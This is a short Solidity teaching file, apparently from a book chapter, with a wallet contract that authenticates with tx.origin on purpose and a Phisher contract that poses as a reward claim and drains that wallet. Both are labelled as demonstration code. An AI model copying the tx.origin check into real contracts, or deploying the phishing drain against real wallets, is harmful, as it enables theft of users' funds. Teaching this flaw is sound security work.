// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title TxOriginWallet
/// @author Sami BELHADJ, Book 3, Chapter 3
/// @notice DELIBERATELY VULNERABLE: authenticates with tx.origin, so any
///         contract the owner calls can spend from it. Do not deploy.
contract TxOriginWallet {
    /// @notice The wallet's owner.
    address public immutable owner;

    /// @notice Deploys the wallet with the ether sent.
    constructor() payable {
        owner = msg.sender;
    }

    /// @notice Sends `amount` to `to` if the transaction began with the owner.
    /// @param to Recipient.
    /// @param amount Wei to send.
    function transferTo(address payable to, uint256 amount) external {
        require(tx.origin == owner, "Not owner");   // the bug: should be msg.sender
        (bool ok,) = to.call{value: amount}("");
        require(ok, "Transfer failed");
    }
}

/// @title Phisher
/// @author Sami BELHADJ, Book 3, Chapter 3
/// @notice A contract the owner is tricked into calling, for example as a
///         "free mint". Exists only to demonstrate the attack in tests.
contract Phisher {
    /// @notice The wallet to empty.
    TxOriginWallet public immutable wallet;
    /// @notice Account that receives the stolen ether.
    address payable public immutable thief;

    /// @param wallet_ The wallet to empty.
    constructor(TxOriginWallet wallet_) {
        wallet = wallet_;
        thief = payable(msg.sender);
    }

    /// @notice Looks like a reward claim; empties the caller's wallet instead.
    function claimReward() external {
        wallet.transferTo(thief, address(wallet).balance);
    }
}
